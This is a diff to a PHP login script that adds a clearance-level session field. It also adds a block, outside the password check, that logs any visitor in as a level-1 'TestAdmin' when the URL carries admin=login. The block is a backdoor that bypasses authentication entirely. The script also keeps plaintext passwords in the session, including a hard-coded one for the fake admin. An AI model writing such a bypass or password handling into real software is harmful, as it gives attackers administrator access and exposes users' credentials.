@@ -38,8 +38,21 @@ if (password_verify($password, $hash)) {
         $_SESSION["Username"] = $row["UserName"];
         $_SESSION["Logged_IN"] = 2;
         $_SESSION["password"] = $password;
+		$_SESSION["Clearance_Level"] = $row["Clearance_Level"];
     }
 
     header('Location: ../home.php');
-}
+} 
 
+if($_GET['admin'] == "login")
+{
+	    $_SESSION["Email"] = "";
+        $_SESSION["First_Name"] = "Admin First Name";
+        $_SESSION["Last_Name"] = "Admin Last Name";
+        $_SESSION["Username"] = "TestAdmin";
+        $_SESSION["Logged_IN"] = 2;
+        $_SESSION["password"] = "aaa";
+		$_SESSION["Clearance_Level"] = 1;
+		    header('Location: ../home.php');
+
+}
